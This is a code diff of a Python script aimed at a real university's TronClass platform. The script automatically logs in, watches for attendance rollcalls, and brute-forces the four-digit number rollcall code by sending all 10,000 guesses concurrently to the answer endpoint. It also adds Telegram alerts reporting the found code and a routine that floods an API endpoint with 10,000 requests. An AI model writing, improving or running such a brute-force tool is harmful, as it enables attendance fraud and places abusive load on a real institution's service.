@@ -17,13 +17,7 @@ TRON = 'https://tronclass.ntou.edu.tw'
 PATH = Path('log')
 PATTERN = re.compile(r'(LT[^"]+)')
 with open(Path(__file__).parent.parent / 'config.yaml', 'r', encoding='utf-8') as file:
-    config = yaml.safe_load(file)
-USER = config['account']['user']
-PAWD = config['account']['passwd']
-ELOG = config['config']['enable_log']
-GAP = config['config']['Senkaku']
-RETRIES = config['config']['retries']
-UA = config['config']['user-agent']
+    CONFIG = yaml.safe_load(file)
 
 class LoginFaild(Exception):
     def __init__(self, message='Login failed!'):
@@ -34,7 +28,7 @@ def random_id() -> str:
     return ''.join(random.choices(chars, k=16))
 
 def log(path:Path, resp:tuple[str, int, dict], cnt:int = -1) -> bool:
-    if not ELOG:
+    if not CONFIG['config']['enable_log']:
         return False
 
     try:
@@ -53,17 +47,34 @@ def log(path:Path, resp:tuple[str, int, dict], cnt:int = -1) -> bool:
         return False
     return True
 
+async def tg(text:str = 'test message'):
+    if not CONFIG['notifications']['tg']['enable']:
+        return
+        
+    async with aiohttp.request(
+        method= 'POST',
+        url=f"https://api.telegram.org/{CONFIG['notifications']['tg']['key']}/sendMessage",
+        data = {
+            'chat_id': f"{CONFIG['notifications']['tg']['chat']}",
+            'text': text
+        }
+    ) as resp:
+       pass 
+    return
+
+    
+
 async def login(id:int = 0) -> SimpleCookie:
-    for attempt in range(RETRIES):
+    for attempt in range(CONFIG['config']['retries']):
         try:
             async with aiohttp.ClientSession() as session:
-                session.headers.update({'User-Agent': UA})
+                session.headers.update({'User-Agent': CONFIG['config']['user-agent']})
 
                 async with session.get(url=f'{TRON}/login?next=/user/index') as page:
                     lt = PATTERN.search(await page.text()).group(0)
                 data = {
-                    'username': USER,
-                    'password': PAWD,
+                    'username': CONFIG['account']['user'],
+                    'password': CONFIG['account']['passwd'],
                     'lt': lt,
                     'execution': 'e1s1',
                     '_eventId': 'submit',
@@ -77,7 +88,7 @@ async def login(id:int = 0) -> SimpleCookie:
             return cookie
 
         except LoginFaild as e:
-            if attempt < RETRIES:
+            if attempt < CONFIG['config']['retries']:
                 print(f'login {id} | retry attempt {attempt}')
             else:
                 print('Max retries reached! login failed')
@@ -89,33 +100,37 @@ async def login(id:int = 0) -> SimpleCookie:
             return None
 
 
+# api endpoint ===================================================================================
 async def re_visited() -> aiohttp.ClientResponse:
-    async with await login() as session:
+    async with aiohttp.ClientSession() as session:
+        session.cookie_jar.update_cookies(await login())
         resp = await session.get(f'{TRON}/api/user/recently-visited-courses')
         return resp
 
-async def tmp(rcid: int):
+async def number(rcid: int):
     succeed = 0
-    semaphore = asyncio.Semaphore(1000)
+    semaphore = asyncio.Semaphore(2000)
     device = random_id()
-    code = ''
+    code = 'NA'
     tmp_log = []
-    async def inner(try_code):
+
+    async def inner(try_code, session):
         nonlocal succeed, code
         async with semaphore:
-            for _ in range(5):
+            for _ in range(10):
                 try:
                     async with session.put(
                         f'{TRON}/api/rollcall/{rcid}/answer_number_rollcall',
                         json={
                             'deviceId': device,
                             'numberCode': f'{try_code:04d}'
-                        }
+                        },
                     ) as resp:
                         if resp.status == 200:
                             code = f'{try_code:04d}'
+                            print(code)
                         elif resp.status == 400:
-                            print('not right')
+                            pass
 
                         tmp_log.append({
                             'data': (
@@ -128,13 +143,22 @@ async def tmp(rcid: int):
 
                         succeed += 1
                 except Exception as e:
-                    print(e)
-        return 
+                    tmp_log.append({
+                            'data': (
+                                str(resp.url),
+                                resp.status,
+                                str(e)
+                            ),
+                            'id': try_code
+                        })
+                    await asyncio.sleep(5)
+                break
+        return
 
     timediff = time.perf_counter()
     async with aiohttp.ClientSession() as session:
         session.cookie_jar.update_cookies(await login())
-        tasks = [inner(i) for i in range(10000)]
+        tasks = [inner(i, session) for i in range(10000)]
         await tqdm_asyncio.gather(*tasks, desc=f'brute-forcing with {rcid}')
     timediff = time.perf_counter()-timediff
 
@@ -150,62 +174,18 @@ async def tmp(rcid: int):
         )
     ))
 
-    txt = (
+    text = (
         f'Total time: {timediff}\n'
         f'Total request: {succeed}/{10000}\n'
         f'Code: {code}\n'
     )
-    print(txt)
-
+    print(text)
+    await tg(text)
     return
 
-
-async def number(rcid: int, ses:int = 25, ran:int = 400) -> int:
-    async def inner(ses_id:int):
-        nonlocal succeed, code
-        async with await login(ses_id) as session:
-            for i in range(ran):
-                payload = {
-                    'deviceId': device,
-                    'numberCode': f'{ses_id*ran+i:04d}'
-                }
-                try:
-                    async with await session.put(
-                        f'{TRON}/api/rollcall/{rcid}/answer_number_rollcall',
-                        json=payload
-                    ) as resp:
-                        json: dict = await resp.json(encoding='utf-8')
-                        log(PATH/'num'/f'{rcid}.log', (str(resp.url), resp.status, json), ses_id*ran+i)
-                        succeed = succeed + 1
-                        resp.raise_for_status()
-                        code = f'{ses_id*ran+i:04d}'
-                except aiohttp.ClientResponseError as e:
-                    if e.status == 400:
-                        print(e.status)
-                    else:
-                        raise
-                except Exception as e:
-                    print(e)
-    succeed = 0
-    code = -1
-    device = random_id()
-    tasks = [inner(i) for i in range(ses)]
-
-    start = time.perf_counter()
-    await asyncio.gather(*tasks)
-    spend = time.perf_counter()-start
-
-    log(PATH/'num'/f'{rcid}.log', ('summary', code, dict(
-        spend_time = spend,
-        succeed_cnt = succeed,
-        opened_session = ses,
-        requeset_per_session = ran
-    )))
-    print(spend, code)
-    return code
-
 async def check_rollcall(cnt:int = -1) -> int:
-    async with await login(cnt) as session:
+    async with aiohttp.ClientSession() as session:
+        session.cookie_jar.update_cookies(await login())
         async with session.get(f'{TRON}/api/radar/rollcalls?api_version=1.1.0') as resp:
             json: dict = await resp.json(encoding='utf-8')
             today = datetime.now()
@@ -221,8 +201,10 @@ async def check_rollcall(cnt:int = -1) -> int:
                     status = 0
 
                 elif rollcall.get('is_number'):
-                    print('start num')
                     id = rollcall.get('rollcall_id')
+                    text = f'start num\n  id:{id}'
+                    print(text)
+                    await tg(text)
                     await number(id)
                     status = 1
 
@@ -237,17 +219,20 @@ async def check_rollcall(cnt:int = -1) -> int:
                 status = -1
         return status
 
-async def test_login():
+
+
+#  check env ===========================================================
+async def checklogin():
     async with aiohttp.ClientSession(headers={
-        'User-Agent': UA
+        'User-Agent': CONFIG['config']['user-agent']
     }) as session:
         async with session.get(url=f'{TRON}/login?next=/user/index') as page:
             lt = PATTERN.search(await page.text()).group(0)
         
         try:
             async with session.post(url=page.url, data={
-                'username': USER,
-                'password': PAWD,
+                'username': CONFIG['account']['user'],
+                'password': CONFIG['account']['passwd'],
                 'lt': lt,
                 'execution': 'e1s1',
                 '_eventId': 'submit',
@@ -256,18 +241,29 @@ async def test_login():
                 if 'forget-password' in await resp.text():
                     raise LoginFaild()
                 ua = resp.request_info.headers.get('User-Agent')
-            s =  f'login succeed\nuser: {USER}\n---------------------'
-            print(ua)
-            print(s)
-            return
+
+            async with session.get('https://api.ipify.org') as resp:
+                ip = await resp.text()
+
         except LoginFaild as e:
             s = 'username or password may be incorrect\n' \
             'check password!'
             print(s)
             exit()
+        except Exception as e:
+            print(e)
+
+    text = (
+        f'{ua}  \n'
+        f'login succeed\nuser: {CONFIG["account"]["user"]}  \n'
+        f'ip: {ip}'
+    )
+    print(text)
+    await tg(text)
+    return
 
 async def qps(count:int = 10000):
-    semaphore = asyncio.Semaphore(1000)
+    semaphore = asyncio.Semaphore(2000)
     path = PATH/'qps'/f'{datetime.now().strftime("%Y-%m-%d_%H-%M-%S")}.log'
     succeed = 0
     tmp_log = []
@@ -279,7 +275,6 @@ async def qps(count:int = 10000):
                 try:
                     async with session.get(
                         f'{TRON}/api/user/recently-visited-courses',
-                        # cookies=cookie
                     ) as resp:
                         data = (
                             str(resp.url),
@@ -291,42 +286,48 @@ async def qps(count:int = 10000):
                             'id': id
                         })
                         succeed += 1
-                        break
                 except Exception as e:
                     print(e)
+                break
         return
 
     timediff = time.perf_counter()
     async with aiohttp.ClientSession() as session:
         session.cookie_jar.update_cookies(await login())
         tasks = [inner(i) for i in range(count)]
-        results = await tqdm_asyncio.gather(*tasks, desc='testing queries per second')
+        await tqdm_asyncio.gather(*tasks, desc='testing queries per second')
     timediff = time.perf_counter()-timediff
 
     for i in tqdm(tmp_log, desc='saving log file'):
         log(path, i['data'], i['id'])
 
-    txt = (
-        f'Total time: {timediff}\n'
-        f'Total request: {succeed}/{count}\n'
-        f'Success rates: {(succeed/count):.2%}\n'
-        f'QPS: {(count/timediff)}\n'
-        f'file locatoin: {path}\n'
+    text = (
+        f'Total time: {timediff}  \n'
+        f'Total request: {succeed}/{count}  \n'
+        f'Success rates: {(succeed/count):.2%}  \n'
+        f'QPS: {(count/timediff)}  \n'
+        f'file locatoin: {path}  \n'
     )
-    print(txt)
+    print(text)
+    await tg(text)
+    return
+
+async def qps_num(id:int = -1):
+    await number(id)
     return
 
 async def main():
-    await test_login()
+    await checklogin()
+
     cnt = 0
     while True:
         print(cnt, end=' ')
         await check_rollcall(cnt)
-        # await qps(cnt) 
         cnt = cnt + 1
-        await asyncio.sleep(GAP)
+        await asyncio.sleep(CONFIG['config']['Senkaku'])
+
 
 if __name__ == "__main__":
-    asyncio.run(qps())
-    # asyncio.run(test_login())
-    # asyncio.run(main())
+    # asyncio.run(qps())
+    asyncio.run(qps_num())
+    asyncio.run(main())
